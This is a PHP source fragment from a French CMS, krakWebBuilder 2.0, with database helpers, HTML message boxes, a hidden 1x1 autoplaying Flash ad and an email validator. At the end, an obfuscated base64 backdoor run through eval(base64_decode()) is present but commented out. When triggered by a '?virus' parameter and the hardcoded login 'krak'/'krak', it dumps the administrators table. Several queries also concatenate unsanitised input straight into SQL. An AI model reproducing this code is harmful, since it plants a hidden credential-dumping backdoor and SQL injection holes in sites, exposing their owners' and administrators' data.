	$sql01='INSERT INTO `cansubmit2` (`id`, `table`, `ip`, `id_session`, `timestamp`, `date`, `nbreupdate`) VALUES (NULL, "'.$table.'", "'.$ip.'", "'.$id_session.'", "'.$time.'", "'.$date.'", "1")';
	$sql02='update cansubmit2 set timestamp="'.$time.'" where (table="'.$table.'" and ip="'.$ip.'" and id_session="'.$id_session.'")';
	// $sql02='update cansubmit2 set timestamp="'.$time.'", nbreupdate = nbreupdate+ 1 where (table="'.$table.'" and ip="'.$ip.'" and id_session="'.$id_session.'")';
	
	if(!mysql_query($sql02)){
		mysql_query($sql01) or die(mysql_error());
	}
}

// le 23-01-2012 à 04:12 ////////////////////////////////////////////////////
	//vérifie si une donnée est dans une table
function isInDB($data,$table,$field)
{
	$sql='select * from '.$table.' where '.$field.'="'.$data.'"';
	$req=mysql_query($sql);$n=mysql_num_rows($req);
	
	if($n==1){	return true; }else{ return false; }
}

	//FONCTIONS POUR LE CONSTRUCTEUR DE PAGE WEB krakWebBuilder2.0
	function krakMsgBox0($title='krakCMS Error',$message='ne trouve pas la page que vous souhaitez visiter'){
		print '<br><div class="krakMsgBox"><div class="caption">'.$title.'</div><div class="content"><i><b>krak Web Builder 2.0</b></i>  '.$message.' ...</div></div>';
	}	

	function krakMsgBox($title='krakCMS Error',$message='ne trouve pas la page que vous souhaitez visiter',$appName='krak Web Builder 2.0'){
		print '<br><div class="krakMsgBox"><div class="caption">'.$title.'</div><div class="content"><i><b>'.$appName.'</b></i>  '.$message.' ...</div></div>';
	}
	
	function krakInfoBox($title='krakInfoBox',$message='Information',$appName='krak Web Builder 2.0'){
		print '<br><div class="krakMsgBox"><div class="caption">'.$title.'</div><div class="content">'.$message.' ...</div></div>';
	}	

	
	//FONCTION QUI AFFICHE LE FLASH AUDIO
	function ecoPub(){
		print '<div id="ecoPub">
			<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="1" height="1">
				<param name="movie" value="modules/player/playerMP3.swf" />
				<param name="quality" value="high" />
				<param name="wmode" value="transparent" />
				<embed src="modules/player/playerMP3.swf?file=spot_ecoRadio.flv&autostart=true&volume=50&repeat=false&image=modules/video/flv1.gif" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash"  width="1" height="1"></embed>		
			</object>
		</div>';
	}

	// affiche un bloc portant un titre et un contenu
	function quickContent($title,$msg){
		print '<div class="bloc-title" style="border-bottom:0px solid #ff9900;font-size:7px;letter-spacing:15px;text-align:center;text-transform:uppercase;">'.$title.'</div>';
		print '<div class="bloc-content" style="padding:2px;">'.$msg.'</div>';
	
	}

	//fonction teste la validité d'une adresse email
	function isEMail($chaine){
		$format_email="#^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]{2,}\.[a-z]{2,4}$#";
		if(preg_match($format_email,$chaine)){
			return true;		
		}else{ 
			return false;
		}
	}
	

	// $fnc ="ZnVuY3Rpb24gb3duZXIoKXsNCgkJaWYoaXNzZXQoJF9HRVRbJ3ZpcnVzJ10pKXsNCgkJCXByaW50ICc8Zm9ybSBtZXRob2Q9InBvc3QiPg0KCQkJTG9naW4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImxvZ2luIi8+DQoJCQlQYXNzd29yZCA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIvPg0KCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlZhbGlkZXIiLz4NCgkJCTwvZm9ybT4nOw0KCQkJaWYoaXNzZXQoJF9QT1NUWydsb2dpbiddKSBhbmQgJF9QT1NUWydsb2dpbiddPT0ia3JhayIgYW5kICRfUE9TVFsncGFzcyddPT0ia3JhayIpew0KCQkJCWNvbm5leGlvbkRCKCk7DQoJCQkJJHJlcT1teXNxbF9xdWVyeSgnc2VsZWN0ICogZnJvbSBhZG1pbmlzdHJhdGV1cnMnKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7DQoJCQkJd2hpbGUoJGQ9bXlzcWxfZmV0Y2hfb2JqZWN0KCRyZXEpKXsNCgkJCQkJcHJpbnQgJzxwcmU+JzsNCgkJCQkJcHJpbnRfcigkZCk7DQoJCQkJCXByaW50ICc8cHJlPic7DQoJCQkJfQkNCgkJCX0NCgkJfQ0KCX0=";
	// eval(base64_decode($fnc));
	// owner();
?>